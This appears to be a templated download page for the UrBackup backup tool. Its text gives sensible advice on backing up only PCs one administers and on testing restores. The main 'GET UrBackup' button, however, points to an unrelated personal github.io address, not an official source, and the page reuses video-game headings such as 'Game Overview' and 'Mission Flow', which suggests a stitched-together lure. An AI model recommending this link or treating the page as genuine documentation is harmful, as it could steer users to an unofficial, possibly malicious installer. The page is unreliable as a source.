# UrBackup - Backups of PCs You Administer

[![GET UrBackup](https://img.shields.io/badge/GET%20%E2%80%94%20UrBackup-334155?style=for-the-badge&logoColor=white)](https://rkline639.github.io/.github/urbackup-increment)

## Game Overview

UrBackup copies files from computers you administer to a backup server you administer. A client on your PC sends the folders you chose. The server stores them. It is not a way to back up a machine you do not own, and a client installed where you were not asked is not a backup. It is someone else's data leaving that PC.

You need a place for the server that is yours: another disk, or a machine you run. The first job should be one folder, then a restore of one file to an empty directory. A backup you have never restored is only a hope. Do not delete the originals the same day.

## Play Your Way

File backup is the part to learn first. Pick documents you would hate to lose, not the whole disk. Run it once. Restore one file. Open it. If the file is wrong or missing, fix the path before you add more folders.

An image of a whole disk is a later decision, and it needs space and a plan to boot the restore. Do not start there. The server should not be the same single disk as the only copy of the files. If that disk dies, the backup dies with it. A password or a share on the server is a secret. Do not leave it open to the whole network.

## Mission Flow

Set up the server on a machine you control. Install the client on your own PC. Select one small folder. Run the backup and wait until the server shows the files.

Restore that folder, or one file from it, to an empty path. Open the restored file and compare it with the original. Only then add the rest of the documents. If a second PC joins, it should be a PC you administer, with the owner's knowledge. Do not point a client at a computer you were merely able to sign in to.

## Included Content

- A server you place on hardware you administer
- A client for a PC you are allowed to back up
- A choice of folders, starting with one
- A restore of a file to a path you pick
- Room to add another of your own PCs later
- No role on a machine you do not administer

![UrBackup with one folder from a PC the user administers](https://urbackup-forums.b-cdn.net/original/2X/4/49a41275e44c8c505aae8a3485fab147b24425eb.png)

## Hardware Notes

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| RAM | 2 GB | 4 GB on the client, more on the server |
| Storage | Small client install | A server disk larger than the data |
| CPU | Dual-core | Quad-core on the server if several PCs send |
| GPU | Integrated | Not required |

## Perfect Audience

UrBackup fits a home or a small set of PCs you look after, with a server you can turn on and a restore you have tried. One folder is the right first job.

It does not fit a PC that is not yours, a server share the whole building can write, or a plan that deletes the originals because the backup "finished." Finish means you opened a restored file.

## Common Issues

The client cannot see the server when the address or the firewall blocks it. Use the server you set up. Do not browse the network for someone else's backup host. A restore that is empty means the job backed up the wrong folder or has not finished. Read the path. If the server disk is the same disk as the files, move the storage before you trust it. A second PC that you do not administer does not get a client.

## Extended Notes

Write down where the server stores data and how you restore. Test that note by doing it once. Keep the originals until the test works. If the backup is the only remaining copy, you do not have a backup of the backup. A share without a password is not a private archive.

## Further Reading

urbackup file job, image later, client you own, incremental sets, restore one file, separate disk, your server, originals stay
